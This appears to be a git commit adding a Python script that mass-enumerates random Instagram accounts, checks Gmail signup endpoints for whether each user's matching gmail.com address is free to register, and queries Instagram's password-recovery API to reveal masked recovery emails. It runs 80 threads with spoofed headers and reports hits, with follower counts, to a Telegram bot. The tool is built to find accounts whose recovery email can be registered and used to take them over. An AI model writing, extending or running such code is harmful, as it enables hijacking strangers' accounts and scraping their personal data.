bf66d43085bf1b3435bd21a331faab56121c03a5
NEXT <i0771649435@gmail.com>
2025-11-15 20:11:47 +0100

    Add files via upload

---
+++ SO.py
@@ -0,0 +1,361 @@
+import requests
+import time
+import random
+import json, string
+from threading import Thread
+import os
+from user_agent import *
+from requests import post as pp
+from user_agent import generate_user_agent as ggb
+from random import choice as cc
+from random import randrange as rr
+import re
+import hashlib
+import uuid
+import telebot
+from requests import get
+import sys
+from datetime import datetime
+
+
+try:
+    from cfonts import render, say
+except:
+    os.system('pip install python-cfonts')
+    try:
+        from cfonts import render, say
+    except:
+        render = lambda text, **k: text
+
+
+
+TOKEN=input('TOKEN :- ')
+bot=telebot.TeleBot(TOKEN)
+ID= input('ID : ')
+os.system('clear')
+total = 0
+hits = 0
+bad_gm = 0
+bad_mail = 0
+goodig = 0
+infoinsta = {}
+import requests
+yy = 'azertyuiopmlkjhgfdsqwxcvbn'
+
+def tll():
+    try:
+        n1 = ''.join(cc(yy) for i in range(rr(6, 9)))
+        n2 = ''.join(cc(yy) for i in range(rr(3, 9)))
+        host = ''.join(cc(yy) for i in range(rr(15, 30)))
+        he3 = {
+            "accept": "*/*",
+            "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
+            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
+            "google-accounts-xsrf": "1",
+            'user-agent': str(ggb()),
+        }
+        res1 = requests.get(
+            'https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', 
+            headers=he3
+        )
+        tok = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
+        cookies = {
+            '__Host-GAPS': host
+        }
+        headers = {
+            'authority': 'accounts.google.com',
+            'accept': '*/*',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
+            'google-accounts-xsrf': '1',
+            'origin': 'https://accounts.google.com',
+            'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn',
+            'user-agent': ggb(),
+        }
+        data = {
+            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
+            'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
+        }
+        response = requests.post(
+            'https://accounts.google.com/_/signup/validatepersonaldetails',
+            cookies=cookies,
+            headers=headers,
+            data=data,
+        )
+        tl = str(response.text).split('",null,"')[1].split('"')[0]
+        host = response.cookies.get_dict()['__Host-GAPS']
+        with open('tl.txt', 'w') as f:
+            f.write(f'{tl}//{host}\n')
+    except Exception as e:
+        print(e)
+        tll()
+tll()
+
+def check_gmail(email):
+    global bad_mail, hits
+    try:
+        if '@' in email:
+            email = str(email).split('@')[0]
+
+        try:
+            o = open('tl.txt', 'r').read().splitlines()[0]
+        except:
+            o = open('tl.txt', 'r').read().splitlines()[0]
+
+        tl, host = o.split('//')
+
+        cookies = {
+            '__Host-GAPS': host
+        }
+        headers = {
+            'authority': 'accounts.google.com',
+            'accept': '*/*',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
+            'google-accounts-xsrf': '1',
+            'origin': 'https://accounts.google.com',
+            'referer': f'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}',
+            'user-agent': ggb(),
+        }
+
+        params = {'TL': tl}
+        data = (
+            'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn'
+            f'&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
+        )
+        response = pp(
+            'https://accounts.google.com/_/signup/usernameavailability',
+            params=params,
+            cookies=cookies,
+            headers=headers,
+            data=data,
+        )
+        if '"gf.uar",1' in str(response.text):
+            hits += 1
+            pppp()
+            if '@' not in email:
+                ok = email + '@gmail.com'
+                username, gg = ok.split('@')
+                InfoAcc(username, gg)
+            else:
+                username, gg = email.split('@')
+                InfoAcc(username, gg)
+        else: 
+          bad_mail+=1
+          pppp()
+    except:''
+def check(email):
+    global goodig, bad_gm
+    ua = generate_user_agent()
+    dev = 'android-'
+    device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
+    uui = str(uuid.uuid4())
+    headers = {
+        'User-Agent': ua,
+        'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    }
+    data = {
+        'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' + json.dumps({
+            '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
+            'adid': uui,
+            'guid': uui,
+            'device_id': device_id,
+            'query': email
+        }),
+        'ig_sig_key_version': '4',
+    }
+    response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data).text
+    if email in response:
+        if '@gmail.com' in email:
+            check_gmail(email)
+        goodig += 1
+        pppp()
+    else:
+        bad_gm += 1
+        pppp()
+def rest(user):
+  try:
+    headers = {
+    'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
+    'X-Pigeon-Rawclienttime': '1700251574.982',
+    'X-IG-Connection-Speed': '-1kbps',
+    'X-IG-Bandwidth-Speed-KBPS': '-1.000',
+    'X-IG-Bandwidth-TotalBytes-B': '0',
+    'X-IG-Bandwidth-TotalTime-MS': '0',
+    'X-Bloks-Version-Id': 'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0',
+    'X-IG-Connection-Type': 'WIFI',
+    'X-IG-Capabilities': '3brTvw==',
+    'X-IG-App-ID': '567067343352427',
+    'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
+    'Accept-Language': 'en-GB, en-US',
+     'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
+    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    'Accept-Encoding': 'gzip, deflate',
+    'Host': 'i.instagram.com',
+    'X-FB-HTTP-Engine': 'Liger',
+    'Connection': 'keep-alive',
+    'Content-Length': '356',
+}
+    data = {
+    'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+user+'"}',
+    'ig_sig_key_version': '4',
+  }
+    response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data,).json()
+    r=response['email']
+  except:
+    r='bad'
+  return r
+  
+def date(hy):
+    try:
+        ranges = [
+            (1279000, 2010),
+            (17750000, 2011),
+            (279760000, 2012),
+            (900990000, 2013),
+            (1629010000, 2014),
+            (2500000000, 2015),
+            (3713668786, 2016),
+            (5699785217, 2017),
+            (8597939245, 2018),
+            (21254029834, 2019)
+        ]
+        
+        for upper, year in ranges:
+            if hy <= upper:
+                return year
+        return 2023
+    
+    except Exception:
+        pass
+        
+def InfoAcc(username, gg):
+    global total,ID
+
+    rr= infoinsta.get(username,{})
+
+    Id = rr.get('pk', None)
+    full_name = rr.get('full_name', None)
+    fows = rr.get('follower_count', None)
+    fowg = rr.get('following_count', None)
+    pp = rr.get('media_count', None)
+    isPraise = rr.get('is_private', None)
+    bio = rr.get('biography', None)
+    is_verified = rr.get('is_verified', None)
+    headers = {
+    'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
+    'X-Pigeon-Rawclienttime': '1700251574.982',
+    'X-IG-Connection-Speed': '-1kbps',
+    'X-IG-Bandwidth-Speed-KBPS': '-1.000',
+    'X-IG-Bandwidth-TotalBytes-B': '0',
+    'X-IG-Bandwidth-TotalTime-MS': '0',
+    'X-Bloks-Version-Id': 'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0',
+    'X-IG-Connection-Type': 'WIFI',
+    'X-IG-Capabilities': '3brTvw==',
+    'X-IG-App-ID': '567067343352427',
+    'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
+    'Accept-Language': 'en-GB, en-US',
+     'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
+    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    'Accept-Encoding': 'gzip, deflate',
+    'Host': 'i.instagram.com',
+    'X-FB-HTTP-Engine': 'Liger',
+    'Connection': 'keep-alive',
+    'Content-Length': '356',
+}
+    data = {
+    'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+username+'"}',
+    'ig_sig_key_version': '4',
+  }
+    response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data,).json()
+    r=response['email']
+    try:
+        hy = int(Id) if Id != 'none' else None
+        datte = date(hy) if hy else 'none'
+    except:
+        datte = 'none'
+     
+    
+
+    total += 1
+    url = 'https://t.me/SIN_PHP'
+    img_url = f"https://image.thum.io/get/{url}"
+    img_data = requests.get(img_url).content
+    path = "site.png"
+    open(path, "wb").write(img_data)
+    ss = f'''
+⋘─────⋙    
+❖ - USERNAME :  @{username}
+❖ - NAME :   {full_name}
+❖️ - Follomers:   {fows}
+❖ - Folloing: {fowg}
+❖ - DATA : {datte}
+❖️ - EMAIL :  {username}@{gg}
+❖️ -  REST : {r}
+❖️ - LINK : https://www.instagram.com/{username}/
+⋘──────⋙
+Dev : @SIN_PHP
+'''
+
+    print(ss)
+    l=open("site.png", "rb")
+    bot.send_photo(chat_id=ID,photo=l, caption=ss)
+
+  
+def pppp():
+    true_color = '\033[1;32m'    # أخضر
+    false_color = '\033[1;31m'   # أحمر
+    bad_color = '\033[1;33m'     # أصفر
+    reset = '\033[0m'
+    deco = ''  # زخرفة بسيطة
+
+    sys.stdout.write(f'''\r{deco} {true_color}Hits : [{hits}]{reset} ~ {false_color}False : [{bad_gm}]{reset} ~ {bad_color}Bad Email : [{bad_mail}]{reset} {deco} \r''')
+    sys.stdout.flush()
+
+
+# ===============================
+
+# ===============================
+def gg():
+    while True:
+        data = {
+            "lsd": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
+            "variables": json.dumps({
+                "id": "".join(random.choice('1234567890')for i in range(random.randint(9,10))),
+                "render_surface": "PROFILE"
+            }),
+            "doc_id": "25618261841150840"
+        }
+
+        try:
+            response = requests.post(
+                "https://www.instagram.com/api/graphql",
+                headers={"X-FB-LSD": data["lsd"]},
+                data=data
+            )
+            user_data = response.json().get('data', {}).get('user', {})
+            username = user_data.get('username')
+            if username:
+                infoinsta[username] = user_data
+                emails = [username + '@gmail.com']
+                for email in emails:
+                    check(email)  
+        except Exception:
+            pass
+
+def start_threads(num_threads=80):
+    for _ in range(num_threads):
+        Thread(target=gg, daemon=True).start()  
+
+
+if __name__ == "__main__":
+    start_threads(80)
+
+    
+    try:
+        while True:
+            pppp()
+            time.sleep(0.5)
+    except KeyboardInterrupt:
+        print("\nتم إيقاف البرنامج")
